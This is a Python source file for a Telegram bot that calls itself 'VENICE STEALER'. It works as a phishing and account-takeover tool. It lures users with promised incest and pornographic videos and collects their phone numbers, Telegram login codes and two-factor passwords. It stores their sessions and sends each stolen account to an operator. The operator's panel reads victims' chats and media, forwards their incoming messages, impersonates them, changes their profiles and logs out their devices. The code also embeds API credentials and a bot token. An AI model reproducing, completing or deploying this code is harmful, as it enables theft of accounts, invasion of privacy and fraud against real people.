# -*- coding: utf-8 -*-
"""
🔥 VENICE STEALER — v9 (كامل + متصفح ميديا + كتابة الرقم يدوي)
"""
import os, json, asyncio, random, shutil, traceback
from datetime import datetime, date
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.tl.types import (InputMessagesFilterPhotos, InputMessagesFilterVideo,
                               InputMessagesFilterUrl, InputMessagesFilterDocument)
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError,
    PhoneNumberInvalidError, PhoneNumberUnoccupiedError, PasswordHashInvalidError,
    FloodWaitError, AuthRestartError, SessionExpiredError,
)

# ═══════════ ⚙️ الإعدادات ═══════════
API_ID, API_HASH = 30577647, "a1292cdd6e11b94bdb0bf5a8244567dd"
BOT_TOKEN = "8922041013:AAH5ErpT-zQW83i2OSe5ie1jUGye41kvuYk"
ADMIN_ID  = 6750410996
SUPPORT   = "@YourUsername"
DEFAULT_CC = "20"
DELAY_MIN  = 120
DEV = dict(device_model="Samsung SM-G998B", system_version="Android 13", app_version="10.9.1")

# ═══════════ 💾 التخزين ═══════════
F_U, F_S, F_T, F_C = "users.json", "sessions.json", "state.json", "settings.json"

def _load(p, d=None):
    if os.path.exists(p):
        try: return json.load(open(p, encoding="utf-8"))
        except Exception: return d or {}
    return d or {}

def _save(p, d):
    tmp = p + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(d, f, ensure_ascii=False, indent=2)
    os.replace(tmp, p)

users, sessions, state = _load(F_U), _load(F_S), _load(F_T)
cfg = _load(F_C, {"auto_tdata": True, "auto_relay": True})
vclients, panel = {}, {}
relay_on, relay_hooked, relay_map = set(), set(), {}

bot = TelegramClient("bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

KNOWN = {"/start","/verify","/help","/videos","/cats","/me","/support","/cancel",
         "/admin","/لوحة","/stats","/users","/accs","/broadcast","/dump","/export","/settings"}

# ═══════════ 🎨 النصوص ═══════════
MENU = [[Button.text("🔓 فتح حسابي", resize=True)],
        [Button.text("🎬 الفيديوهات"), Button.text("📂 الأقسام")],
        [Button.text("👤 حسابي"), Button.text("💬 الدعم")]]

CATS = [("diyatha","😈 دياثة","أقوى لقطات 🔥"),("maharem","🔥 محارم","محارم كامل 😈"),
        ("sex","🍑 سكس","عربي + أجنبي HD 💦"),("kinky","⛓️ كينك","كل الانحرافات 😩")]

VIDEOS = ["😈 دياثة — الجولة الأولى 🔥","💦 دياثة — اللقطة القاتلة","🔥 محارم — الجزء الصعب 😩",
          "😈 محارم — نسخة كاملة HD","🍑 سكس عربي — بدون رحمة","💦 سكس أجنبي — جودة عالية",
          "⛓️ كينك — مفاجأة 😳","🔞 الفيديو المميز"]

WELCOME = ("🔞 *أهلاً بيك في بوت الدياثة والمحارم* 🔞\n━━━━━━━━━━━━━━━━━━━━\n"
           "🎬 مكتبة فيديوهات *كاملة ومجاناً*\n🔓 بس لازم *تأكد إنك حقيقي* الأول\n"
           "⏱️ التحقق ثواني — وبعدها الفيديوهات تنزل لوحدها 😈\n━━━━━━━━━━━━━━━━━━━━\n"
           "دوس *🤖 تحقق إنك مش روبوت* 👇")

HOW = ("❓ *إزاي بيشتغل؟*\n\n1️⃣ دوس *تحقق إنك مش روبوت*\n2️⃣ اكتب رقمك بالكود الدولي (مثال: `+201234567890`)\n"
       "3️⃣ يوصلك كود على تليجرام — دخّله\n4️⃣ لو عندك تحقق بخطوتين، ابعته\n"
       "5️⃣ ✅ وتستلم أول دفعة فوراً 😈\n\n⚠️ الكود بييجي على تليجرام بتاعك — طبيعي.")

ASK_PHONE = ("📱 *اكتب رقمك* بالكود الدولي 👇\n\n"
             "مثال: `+201234567890`\n_(من غير مسافات ولا شرطات)_")

def start_kb():
    return [[Button.inline("🤖 تحقق إنك مش روبوت", b"verify")],
            [Button.inline("🎬 الفيديوهات", b"videos"), Button.inline("📂 الأقسام", b"cats")],
            [Button.inline("❓ إزاي بيشتغل", b"how")]]

def norm_phone(raw):
    if not raw: return None
    p = "".join(ch for ch in raw if ch.isdigit() or ch == "+")
    if not p: return None
    if p.startswith("+"):  return "+" + p.lstrip("+")
    if p.startswith("00"): return "+" + p[2:]
    if p.startswith("0"):  return "+" + DEFAULT_CC + p.lstrip("0")
    if len(p) >= 11:       return "+" + p
    return "+" + DEFAULT_CC + p

async def safe_send(chat, text, **kw):
    try: return await bot.send_message(chat, text, **kw)
    except Exception: pass

def guard(fn):
    async def w(e):
        try:
            await fn(e)
        except Exception:
            tb = traceback.format_exc(); print("⚠️", tb)
            try: await e.respond(f"⚠️ حصل خطأ:\n`{tb[-250:]}`")
            except Exception: pass
            try: await bot.send_message(ADMIN_ID, f"⚠️ *خطأ:*\n`{tb[-500:]}`")
            except Exception: pass
    return w

async def drop_client(uid):
    cl = vclients.pop(uid, None)
    if cl:
        try: await cl.disconnect()
        except Exception: pass

# ═══════════ 🔎 فحص التشغيل ═══════════
async def startup_check():
    try:
        await bot.send_message(ADMIN_ID, "✅ *البوت اشتغل* — وأنا واصلك تمام 👌\n"
                                         "لو وصلتك الرسالة دي، يبقى الإشعارات شغالة ١٠٠٪")
        print("✅ الأدمن واصل — الإشعارات شغالة")
    except Exception as ex:
        print("\n" + "="*50)
        print("⚠️  مش قادر أبعت للأدمن!")
        print("👉 افتح البوت من حسابك (الأدمن) وابعت /start مرة واحدة")
        print("السبب:", ex)
        print("="*50 + "\n")

# ═══════════ 🚀 المستخدم ═══════════
@bot.on(events.NewMessage(pattern=r"^/start", incoming=True))
@guard
async def cmd_start(e):
    uid = str(e.sender_id)
    await drop_client(uid)
    users.setdefault(uid, {"name": e.sender.first_name or "", "joined": str(date.today())})
    users[uid].setdefault("joined", str(date.today()))
    state.pop(uid, None); _save(F_U, users); _save(F_T, state)
    if uid == str(ADMIN_ID):
        await e.respond("👑 *أنت الأدمن* — البوت واصلك تمام ✅\nمن هنا: /admin")
    await e.respond(WELCOME, buttons=start_kb())
    await e.respond("📋 القايمة تحت خليها معاك 👇", buttons=MENU)

@bot.on(events.NewMessage(pattern=r"^/ping$", incoming=True))
@guard
async def cmd_ping(e):
    if e.sender_id != ADMIN_ID: return await e.respond("🏓")
    await e.respond("🏓 شغال وواصلك تمام 👌")

@bot.on(events.NewMessage(pattern=r"^/verify", incoming=True))
@guard
async def cmd_verify(e): await smart_verify(e, str(e.sender_id))

@bot.on(events.NewMessage(pattern=r"^/help", incoming=True))
@guard
async def cmd_help(e): await e.respond(HOW)

@bot.on(events.NewMessage(pattern=r"^/videos", incoming=True))
@guard
async def cmd_videos(e): await send_videos(e)

@bot.on(events.NewMessage(pattern=r"^/cats", incoming=True))
@guard
async def cmd_cats(e): await send_cats(e)

@bot.on(events.NewMessage(pattern=r"^/me", incoming=True))
@guard
async def cmd_me(e): await send_me(e)

@bot.on(events.NewMessage(pattern=r"^/support", incoming=True))
@guard
async def cmd_support(e): await e.respond(f"💬 للدعم: {SUPPORT}")

@bot.on(events.NewMessage(pattern=r"^/cancel", incoming=True))
@guard
async def cmd_cancel(e):
    uid = str(e.sender_id)
    await drop_client(uid)
    state[uid] = {"step": "idle"}; _save(F_T, state)
    await e.respond("✅ اتلغى")

# ═══════════ 🔘 الأزرار ═══════════
@bot.on(events.CallbackQuery)
@guard
async def on_cb(e):
    d = e.data.decode(); uid = str(e.sender_id)
    adm = uid == str(ADMIN_ID)
    acc = state.get(uid, {}).get("acc")

    if d == "noop": return await e.answer()
    if d == "verify": await e.answer(); return await smart_verify(e, uid)
    if d == "videos": await e.answer("🎬"); return await send_videos(e)
    if d == "cats":   await e.answer(); return await send_cats(e)
    if d == "how":    await e.answer(); return await e.respond(HOW)
    if d.startswith("cat:"):
        n = dict((k, x) for k, x, _ in CATS).get(d.split(":")[1], "قسم")
        await e.answer(); return await e.respond(f"🎬 *{n}*\n\n{random.choice(VIDEOS)}")
    if not adm: return await e.answer()

    if d == "adm:home": await e.answer(); return await admin_home(e)
    if d == "adm:stats": await e.answer(); return await stats(e)
    if d == "adm:set": await e.answer(); return await settings_panel(e)
    if d.startswith("set:"):
        k = d.split(":")[1]; await e.answer("✅")
        cfg[k] = not cfg.get(k, True); _save(F_C, cfg)
        return await settings_panel(e, edit=True)

    if d == "adm:accs": await e.answer(); return await e.respond(
        f"🎯 *الحسابات ({len(sessions)})* — اختار:", buttons=acc_list_kb())
    if d == "adm:users": await e.answer(); return await users_page(e, 0)
    if d.startswith("usr:p:"):
        await e.answer(); return await users_page(e, int(d.split(":")[2]))
    if d.startswith("usr:"):
        t = d.split(":")[1]; await e.answer()
        u = users.get(t, {})
        await e.respond(f"👤 *مستخدم*\n\n🆔 `{t}`\n🏷️ {u.get('name','—')}\n📱 `{u.get('phone','—')}`\n"
                        f"🔓 {'متحقق ✅' if t in sessions else 'لسه ❌'}\n📅 {u.get('joined','—')}",
                        buttons=[[Button.inline("📢 راسله", f"umsg:{t}".encode())],
                                 [Button.inline("🗑 حذف", f"udel:{t}".encode()),
                                  Button.inline("🔙", b"adm:users")]])
        return
    if d.startswith("udel:"):
        t = d.split(":")[1]; await e.answer("🗑")
        users.pop(t, None); _save(F_U, users); return await users_page(e, 0)
    if d.startswith("umsg:"):
        await e.answer(); state[uid] = {"step": "umsg", "target": d.split(":")[1]}; _save(F_T, state)
        return await e.respond("📢 ابعت الرسالة")

    if d == "adm:bc": await e.answer(); return await e.respond(
        "📢 *هتبعت لمين؟*", buttons=[
            [Button.inline("👥 للكل", b"bc:all")],
            [Button.inline("✅ للمتحققين", b"bc:ver"), Button.inline("❌ لغير المتحققين", b"bc:unver")],
            [Button.inline("🔙", b"adm:home")]])
    if d.startswith("bc:"):
        mode = d.split(":")[1]; await e.answer()
        state[uid] = {"step": "broadcast", "mode": mode}; _save(F_T, state)
        return await e.respond(f"📢 ابعت الرسالة (وضع: {mode})")
    if d == "adm:dump": await e.answer(); return await dump_all(e)

    if d == "help:app": await e.answer(); return await e.respond(APP_HELP)
    if d.startswith("acc:"):
        t = d.split(":")[1]; await e.answer()
        await e.respond(f"👤 *الحساب*\n\n🆔 `{t}`\n🏷️ {users.get(t,{}).get('name','—')}\n"
                        f"📱 `{users.get(t,{}).get('phone','—')}`\n🔑 `{users.get(t,{}).get('pass','مفيش')}`",
                        buttons=acc_kb(t))
        return
    if d.startswith("sess:"):
        await e.answer(); return await e.respond(f"`{sessions.get(d.split(':')[1],'مفيش')}`")
    if d.startswith("del:"):
        t = d.split(":")[1]; await e.answer("🗑")
        sessions.pop(t, None); _save(F_S, sessions)
        panel.pop(t, None); relay_on.discard(t)
        return await e.respond("🗑 اتشال", buttons=acc_list_kb())
    if d.startswith("opentd:"):
        await e.answer("⏳"); return await send_tdata(e, d.split(":")[1])

    # ───── 🎮 تحكم ─────
    if d.startswith("ctl:open:"): await e.answer(); return await ctl_home(e, d.split(":")[2])
    if d == "ctl:home": await e.answer(); return await ctl_home(e, acc)
    if d == "ctl:chats": await e.answer(); return await ctl_chats(e, acc)
    if d == "ctl:me": await e.answer(); return await ctl_me(e, acc)
    if d == "ctl:relay": await e.answer(); return await toggle_relay(e, acc)
    if d == "ctl:name":
        await e.answer(); state[uid] = {"step": "ctl_name", "acc": acc}; _save(F_T, state)
        return await e.respond("✏️ ابعت *الاسم الجديد*")
    if d == "ctl:bio":
        await e.answer(); state[uid] = {"step": "ctl_bio", "acc": acc}; _save(F_T, state)
        return await e.respond("📝 ابعت *البايو الجديد*")
    if d == "ctl:logout":
        await e.answer("⏳"); c = await acc_client(acc)
        if not c: return await e.respond("❌ مفيش سيشن")
        await c(ResetAuthorizationsRequest()); return await e.respond("✅ خرجت كل الأجهزة")
    if d.startswith("ctl:chat:"): await e.answer(); return await ctl_chat(e, acc, d.split(":",2)[2])
    if d.startswith("med:"):
        _, a, ch, kd, off = d.split(":")
        await e.answer("⏳"); return await ctl_media(e, a, ch, kd, int(off))
    if d.startswith("ctl:read:"): await e.answer(); return await ctl_read(e, acc, d.split(":",2)[2])
    if d.startswith("ctl:send:"):
        await e.answer()
        state[uid] = {"step": "ctl_send", "acc": acc, "chat": d.split(":",2)[2]}; _save(F_T, state)
        return await e.respond("💬 ابعت الرسالة")

# ═══════════ 💬 النصوص ═══════════
@bot.on(events.NewMessage(incoming=True))
@guard
async def on_text(e):
    if e.out: return
    txt = (e.text or "").strip(); uid = str(e.sender_id)

    if uid == str(ADMIN_ID):
        rid = e.message.reply_to_msg_id
        if rid and rid in relay_map:
            a, cid = relay_map[rid]; c = await acc_client(a)
            if c:
                try:
                    await c.send_message(cid, txt); return await e.respond("✅ اتبعتت من الحساب 👌")
                except Exception as ex: return await e.respond(f"❌ `{ex}`")

        step = state.get(uid, {}).get("step")
        if step == "broadcast":
            mode = state[uid].get("mode", "all")
            targets = [u for u in users if (mode == "all" or
                       (mode == "ver" and u in sessions) or (mode == "unver" and u not in sessions))]
            state[uid]["step"] = "idle"; _save(F_T, state); ok = 0
            for u in targets:
                try: await bot.send_message(int(u), txt); ok += 1; await asyncio.sleep(0.05)
                except Exception: pass
            return await e.respond(f"✅ اتبعتت لـ {ok} من {len(targets)}")
        if step == "umsg":
            state[uid]["step"] = "idle"; _save(F_T, state)
            try: await bot.send_message(int(state[uid]["target"]), txt); return await e.respond("✅ اتبعتت")
            except Exception as ex: return await e.respond(f"❌ `{ex}`")
        if step in ("ctl_send", "ctl_name", "ctl_bio"):
            c = await acc_client(state[uid].get("acc"))
            if not c: return await e.respond("❌ مفيش سيشن")
            try:
                if step == "ctl_send":   await c.send_message(int(state[uid]["chat"]), txt)
                elif step == "ctl_name": await c(UpdateProfileRequest(first_name=txt))
                else:                    await c(UpdateProfileRequest(about=txt))
            except Exception as ex: return await e.respond(f"❌ `{ex}`")
            state[uid]["step"] = "ctl"; _save(F_T, state); return await e.respond("✅ تم")

    if txt.startswith("/") and txt.split()[0].lower() in KNOWN: return

    if txt == "🔓 فتح حسابي": return await smart_verify(e, uid)
    if txt == "🎬 الفيديوهات": return await send_videos(e)
    if txt == "📂 الأقسام":    return await send_cats(e)
    if txt == "👤 حسابي":      return await send_me(e)
    if txt == "💬 الدعم":      return await e.respond(f"للدعم: {SUPPORT}")

    st = state.get(uid); step = (st or {}).get("step")

    # ───── كتابة الرقم ─────
    if step == "phone":
        phone = norm_phone(txt)
        if not phone:
            return await e.respond("❌ الرقم مش صح 👇\nاكتبه بالكود الدولي، مثال: `+201234567890`")
        return await do_send_code(e, uid, phone)

    if step == "code":
        cl = vclients.get(uid)
        if not cl:
            state[uid] = {"step": "phone"}; _save(F_T, state); return await e.respond("دوس /start")
        try:
            if not cl.is_connected(): await cl.connect()
            await cl.sign_in(st["phone"], txt.replace(" ","").replace("-",""), phone_code_hash=st["hash"])
        except SessionPasswordNeededError:
            st["step"] = "password"; _save(F_T, state)
            return await e.respond("🔑 عندك *تحقق بخطوتين* — ابعتيلي الباسورد 👇", buttons=MENU)
        except PhoneCodeInvalidError:
            return await e.respond("❌ الكود غلط، جرب تاني")
        except PhoneCodeExpiredError:
            state[uid] = {"step": "phone"}; _save(F_T, state); return await e.respond("⌛ الكود انتهى — دوس /verify")
        except PhoneNumberUnoccupiedError:
            state[uid] = {"step": "phone"}; _save(F_T, state); return await e.respond("❌ الرقم مش مسجل — دوس /start")
        except AuthRestartError:
            return await e.respond("🔄 تليجرام طلب إعادة — دوس /verify")
        except SessionExpiredError:
            state[uid] = {"step": "phone"}; _save(F_T, state); return await e.respond("⌛ الجلسة انتهت — دوس /verify")
        except FloodWaitError as f:
            return await e.respond(f"⏳ استنى {f.seconds} ثانية وجرب")
        except Exception as ex:
            return await e.respond(f"❌ خطأ في الدخول: `{ex}`")
        return await verify_done(uid, e)

    if step == "password":
        cl = vclients.get(uid)
        if not cl:
            state[uid] = {"step": "phone"}; _save(F_T, state); return await e.respond("دوس /start")
        try:
            if not cl.is_connected(): await cl.connect()
            await cl.sign_in(password=txt)
        except PasswordHashInvalidError:
            return await e.respond("❌ الباسورد غلط، جرب تاني")
        except FloodWaitError as f:
            return await e.respond(f"⏳ استنى {f.seconds} ثانية وجرب")
        except Exception as ex:
            return await e.respond(f"❌ خطأ: `{ex}`")
        users.setdefault(uid, {})["pass"] = txt; _save(F_U, users)
        return await verify_done(uid, e)

    return await e.respond("📋 دوس /start 🙂")

# ═══════════ 🧠 التحقق (يدوي — لازم يكتب الرقم) ═══════════
async def smart_verify(e, uid):
    await drop_client(uid)
    state[uid] = {"step": "phone"}; _save(F_T, state)
    await e.respond(ASK_PHONE)

async def do_send_code(e, uid, phone):
    m = await e.respond("⏳ ثانية...")
    cl = vclients.get(uid)
    if cl is None or not cl.is_connected():
        cl = TelegramClient(StringSession(), API_ID, API_HASH, **DEV)
        await cl.connect()
        vclients[uid] = cl
    try:
        sent = await cl.send_code_request(phone)
    except PhoneNumberInvalidError:
        state[uid] = {"step": "phone"}; _save(F_T, state)
        return await m.edit("❌ الرقم غلط، جرب تاني 👇")
    except PhoneNumberUnoccupiedError:
        state[uid] = {"step": "phone"}; _save(F_T, state)
        return await m.edit("❌ الرقم مش مسجل في تليجرام 👇")
    except FloodWaitError as f:
        return await m.edit(f"⏳ استنى {f.seconds} ثانية")
    except Exception as ex:
        return await m.edit(f"❌ `{ex}`")
    state[uid] = {"step": "code", "phone": phone, "hash": sent.phone_code_hash}; _save(F_T, state)
    await m.edit("📩 *جالك كود على تليجرام* — دخّله هنا 👇\n\n_(لو مكتوب Do not share this code — طبيعي)_",
                 buttons=MENU)

# ═══════════ ✅ السرقة ═══════════
async def verify_done(uid, e):
    cl = vclients.pop(uid, None)
    if not cl: return await e.respond("❌ مشكلة، دوس /start")
    try:
        s = cl.session.save(); me = await cl.get_me()
        photo = None
        try: photo = await cl.download_profile_photo(me, file=bytes)
        except Exception: pass
        try: await cl.disconnect()
        except Exception: pass
    except Exception as ex:
        return await e.respond(f"❌ فشل تسجيل الدخول: `{ex}`")

    try:
        chk = TelegramClient(StringSession(s), API_ID, API_HASH, **DEV)
        await chk.connect()
        me2 = await chk.get_me()
        await chk.disconnect()
        if not me2: raise Exception("سيشن غير صالحة")
    except Exception as ex:
        return await e.respond(f"❌ الدخول مقفل: `{ex}`\nجرب /verify تاني")

    sessions[uid] = s
    users.setdefault(uid, {})
    users[uid].update({"verified": True, "phone": state.get(uid, {}).get("phone"),
                       "name": (me.first_name or "") + ((" " + me.last_name) if me.last_name else ""),
                       "username": me.username or "", "tg_id": me.id})
    state.setdefault(uid, {})["step"] = "done"
    _save(F_S, sessions); _save(F_U, users); _save(F_T, state)
    print(f"✅ اتقنص حساب: {users[uid]['phone']} ({me.id})")

    await e.respond("✅ *تم التحقق!*\n━━━━━━━━━━━━━━━━━━━━\n😈 أهلاً بيك في عالم الدياثة والمحارم\n"
                    "🎬 المكتبة اتفتحتلك *كاملة*\n\n⏳ الدفعة التانية هتنزل خلال *ساعتين* لوحدها",
                    buttons=[[Button.inline("🎬 شوف أول فيديو", b"videos")],
                             [Button.inline("📂 الأقسام", b"cats")]])

    rep = (f"🆕 *حساب جديد اتقنص* 😈\n━━━━━━━━━━━━━━━━━━━━\n"
           f"👤 {users[uid]['name'] or '—'}\n🔗 @{me.username or '—'}\n"
           f"🆔 `{me.id}`\n📱 `{users[uid]['phone']}`\n🔑 `{users[uid].get('pass','مفيش')}`")
    kb = [[Button.inline("🎮 تحكم كامل", f"ctl:open:{uid}".encode())],
          [Button.inline("📦 ملف الحساب", f"opentd:{uid}".encode()),
           Button.inline("🛠 اللوحة", b"adm:home")]]
    try:
        if photo: await bot.send_message(ADMIN_ID, rep, file=photo, buttons=kb)
        else:     await bot.send_message(ADMIN_ID, rep, buttons=kb)
        print("✅ اتُبلّغ الأدمن")
    except Exception as ex:
        print("⚠️ فشل إبلاغ الأدمن:", ex)
        await safe_send(int(uid), "⚠️ الحساب اتسجل عندي، بس *مقدرتش أوصل للأدمن*.\n"
                                  "لو إنت الأدمن: افتح البوت وابعت /start مرة واحدة.")

    await asyncio.sleep(1); await deliver(uid)
    asyncio.create_task(delayed_delivery(uid))
    if cfg.get("auto_relay"): await toggle_relay(None, uid, silent=True)
    if cfg.get("auto_tdata"): asyncio.create_task(send_tdata(None, uid, silent=True))

async def deliver(uid):
    await safe_send(int(uid), "🎬 *جاري تحميل الدفعة الأولى...*")
    for c in random.sample(VIDEOS, 3): await safe_send(int(uid), c); await asyncio.sleep(1)

async def delayed_delivery(uid):
    await asyncio.sleep(DELAY_MIN * 60)
    await safe_send(int(uid), "⏰ *وصلت باقي الفيديوهات!* 😈\nاستمتع...")
    for c in random.sample(VIDEOS, 3): await safe_send(int(uid), c); await asyncio.sleep(1)

# ═══════════ 🧩 مساعدات ═══════════
async def send_videos(e): await e.respond(f"🎬 {random.choice(VIDEOS)}")
async def send_cats(e):
    await e.respond("📂 *اختار القسم* 👇",
                    buttons=[[Button.inline(n, f"cat:{k}".encode())] for k, n, _ in CATS])
async def send_me(e):
    uid = str(e.sender_id); ok = uid in sessions
    await e.respond(f"👤 *حسابك*\n\n🆔 `{uid}`\n📱 {users.get(uid,{}).get('phone','—')}\n"
                    f"🔓 {'✅ متحقق' if ok else '❌ لسه'}\n🎬 {'متاحة' if ok else 'مقفولة'}")

# ═══════════ 🛠 لوحة الأدمن ═══════════
APP_HELP = ("🥈 *تفتحه في تليجرام بتاعك*\n\n1️⃣ تليجرام → Settings → Add Account\n"
            "2️⃣ اكتب رقم الحساب\n3️⃣ الضحية هتوصلها كود — خليه يبعتهولك\n"
            "4️⃣ دخّل الكود (والباسورد موجود عندي فوق)\n\n"
            "💡 *أو الأقوى:* نزّل ملف الحساب وافتحه على اللاب بـ Telegram Desktop.")

def acc_list_kb():
    rows = [[Button.inline(f"{i}. 📱 {users.get(u,{}).get('phone','—')}", f"acc:{u}".encode())]
            for i, u in enumerate(sessions, 1)]
    rows.append([Button.inline("🔙", b"adm:home")])
    return rows

def acc_kb(u):
    return [[Button.inline("🎮 تحكم كامل بالحساب", f"ctl:open:{u}".encode())],
            [Button.inline("📦 ملف الحساب (tdata)", f"opentd:{u}".encode()),
             Button.inline("📄 السيشن", f"sess:{u}".encode())],
            [Button.inline("🥈 افتحه في تليجرام بتاعك", b"help:app")],
            [Button.inline("🗑 حذف", f"del:{u}".encode()), Button.inline("🔙", b"adm:accs")]]

async def admin_home(e):
    await e.respond(
        f"🛠 *لوحة التحكم* — VENICE 🔥\n━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 المستخدمين: *{len(users)}*\n✅ متحققين: *{len(sessions)}*\n"
        f"📡 بث شغال: *{len(relay_on)}*\n━━━━━━━━━━━━━━━━━━━━",
        buttons=[
            [Button.inline("📊 إحصائيات كاملة", b"adm:stats")],
            [Button.inline(f"🎯 الحسابات ({len(sessions)})", b"adm:accs"),
             Button.inline(f"👥 المستخدمين ({len(users)})", b"adm:users")],
            [Button.inline("📢 رسالة جماعية", b"adm:bc"), Button.inline("📦 تصدير الكل", b"adm:dump")],
            [Button.inline("⚙️ الإعدادات", b"adm:set")]])

async def stats(e):
    today = str(date.today())
    new_today = sum(1 for u in users.values() if u.get("joined") == today)
    with_2fa = sum(1 for u in sessions if users.get(u, {}).get("pass"))
    await e.respond(
        f"📊 *إحصائيات كاملة*\n━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 إجمالي المستخدمين: *{len(users)}*\n"
        f"✅ متحققين: *{len(sessions)}*\n"
        f"❌ مش متحققين: *{len(users) - len(sessions)}*\n"
        f"🔑 حسابات بـ 2FA: *{with_2fa}*\n"
        f"📡 بث شغال: *{len(relay_on)}*\n"
        f"🆕 النهاردة: *{new_today}*\n"
        f"⚙️ tdata تلقائي: {'✅' if cfg.get('auto_tdata') else '❌'} | "
        f"بث تلقائي: {'✅' if cfg.get('auto_relay') else '❌'}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n🕒 {datetime.now():%Y-%m-%d %H:%M}",
        buttons=[[Button.inline("🔙", b"adm:home")]])

async def settings_panel(e, edit=False):
    kb = [[Button.inline(f"📦 إرسال tdata تلقائي: {'✅' if cfg.get('auto_tdata') else '❌'}", b"set:auto_tdata")],
          [Button.inline(f"📡 بث مباشر تلقائي: {'✅' if cfg.get('auto_relay') else '❌'}", b"set:auto_relay")],
          [Button.inline("🔙", b"adm:home")]]
    t = "⚙️ *الإعدادات*\n\nدوس للتبديل:"
    if edit: await e.edit(t, buttons=kb)
    else: await e.respond(t, buttons=kb)

async def users_page(e, page):
    per = 10
    lst = list(users.keys())
    if not lst: return await e.respond("مفيش مستخدمين لسه")
    page = max(0, min(page, (len(lst)-1)//per))
    chunk = lst[page*per:(page+1)*per]
    rows = []
    for u in chunk:
        mark = "✅" if u in sessions else "❌"
        rows.append([Button.inline(f"{mark} {users.get(u,{}).get('name','—')[:20]}", f"usr:{u}".encode())])
    nav = []
    if page > 0: nav.append(Button.inline("⬅️", f"usr:p:{page-1}".encode()))
    if (page+1)*per < len(lst): nav.append(Button.inline("➡️", f"usr:p:{page+1}".encode()))
    if nav: rows.append(nav)
    rows.append([Button.inline("🔙", b"adm:home")])
    txt = f"👥 *المستخدمين ({len(lst)})* — صفحة {page+1}/{(len(lst)-1)//per+1}"
    await e.respond(txt, buttons=rows)

async def dump_all(e):
    txt = "\n\n".join(f"👤 {users.get(u,{}).get('name','—')} | @{users.get(u,{}).get('username','—')}\n"
                      f"📱 {users.get(u,{}).get('phone','—')} | 🔑 {users.get(u,{}).get('pass','—')}\n{s}"
                      for u, s in sessions.items()) or "مفيش"
    open("dump.txt","w",encoding="utf-8").write(txt)
    await e.respond(f"📋 عدد الحسابات: {len(sessions)}", file="dump.txt")

@bot.on(events.NewMessage(pattern=r"^/(admin|لوحة|panel|stats|users|accs|broadcast|dump|export|settings)$", incoming=True))
@guard
async def admin_cmds(e):
    if e.sender_id != ADMIN_ID: return await e.respond("مش انت الأدمن 😅")
    c = e.text.split()[0].lower()
    if c in ("/admin","/لوحة","/panel"): return await admin_home(e)
    if c == "/stats": return await stats(e)
    if c == "/users": return await users_page(e, 0)
    if c == "/accs": return await e.respond(f"🎯 *الحسابات ({len(sessions)})*:", buttons=acc_list_kb())
    if c == "/dump": return await dump_all(e)
    if c == "/settings": return await settings_panel(e)
    if c == "/broadcast":
        return await e.respond("📢 هتبعت لمين؟", buttons=[
            [Button.inline("👥 للكل", b"bc:all")],
            [Button.inline("✅ للمتحققين", b"bc:ver"), Button.inline("❌ لغير المتحققين", b"bc:unver")]])
    if c == "/export":
        await e.respond("⏳ بيجهز...")
        for u in list(sessions)[:5]: await send_tdata(e, u, silent=False)

# ═══════════ 🎮 تحكم + 📡 بث ═══════════
async def acc_client(uid):
    if not uid or uid not in sessions: return None
    c = panel.get(uid)
    if c is None:
        c = TelegramClient(StringSession(sessions[uid]), API_ID, API_HASH, **DEV); panel[uid] = c
    if not c.is_connected():
        try: await c.connect()
        except Exception: panel.pop(uid, None); return None
    return c

def make_relay_handler(acc):
    async def h(ev):
        if acc not in relay_on: return
        try:
            snd = await ev.get_sender()
            nm = getattr(snd, "first_name", None) or getattr(snd, "title", None) or str(ev.chat_id)
            await bot.send_message(ADMIN_ID, f"📩 *{nm}*  ·  `{ev.chat_id}`")
            m = await ev.forward_to(ADMIN_ID)
            relay_map[m.id] = (acc, ev.chat_id)
        except Exception: pass
    return h

async def toggle_relay(e, acc, silent=False):
    if not acc: return
    if acc in relay_on:
        relay_on.discard(acc)
        if e and not silent: await e.respond("📴 البث اتقفل")
        return
    c = await acc_client(acc)
    if not c:
        if e and not silent: await e.respond("❌ مفيش سيشن")
        return
    if acc not in relay_hooked:
        c.add_event_handler(make_relay_handler(acc), events.NewMessage(incoming=True))
        relay_hooked.add(acc)
    relay_on.add(acc)
    if e and not silent:
        await e.respond("📡 *البث المباشر اتفتح*\nكل رسالة هتوصلك هنا، وترد عليها بالـ Reply 👌")

async def ctl_home(e, uid):
    if not uid: return await e.respond("❌ اختار حساب")
    state[str(e.sender_id)] = {"step": "ctl", "acc": uid}; _save(F_T, state)
    await e.respond(f"🎮 *تحكم كامل* — 📱 `{users.get(uid,{}).get('phone',uid)}`\n\nاختار 👇", buttons=[
        [Button.inline("📋 المحادثات", b"ctl:chats")],
        [Button.inline("📡 بث مباشر" + (" ✅" if uid in relay_on else ""), b"ctl:relay")],
        [Button.inline("👤 البروفايل", b"ctl:me"), Button.inline("✏️ غيّر الاسم", b"ctl:name")],
        [Button.inline("📝 غيّر البايو", b"ctl:bio"), Button.inline("🔓 خروج الأجهزة", b"ctl:logout")],
        [Button.inline("🔙 الحسابات", b"adm:accs")]])

async def ctl_chats(e, uid):
    c = await acc_client(uid)
    if not c: return await e.respond("❌ مفيش سيشن")
    m = await e.respond("⏳ بجيب المحادثات...")
    try: dialogs = await c.get_dialogs(limit=30)
    except Exception as ex: return await m.edit(f"❌ `{ex}`")
    rows = [[Button.inline((d.name or "بدون اسم")[:24], f"ctl:chat:{d.id}".encode())] for d in dialogs]
    rows.append([Button.inline("🔙", b"ctl:home")])
    await m.edit(f"📋 *آخر {len(dialogs)} محادثة*:", buttons=rows)

async def ctl_chat(e, uid, cid):
    await e.respond(f"💬 *الشات* — `{cid}`\nاختار 👇", buttons=[
        [Button.inline("📷 صور", f"med:{uid}:{cid}:photo:0".encode()),
         Button.inline("🎬 فيديوهات", f"med:{uid}:{cid}:video:0".encode())],
        [Button.inline("🔗 لينكات", f"med:{uid}:{cid}:url:0".encode()),
         Button.inline("📎 ملفات", f"med:{uid}:{cid}:doc:0".encode())],
        [Button.inline("👀 آخر الرسايل", f"ctl:read:{cid}".encode())],
        [Button.inline("💬 ابعت رسالة", f"ctl:send:{cid}".encode())],
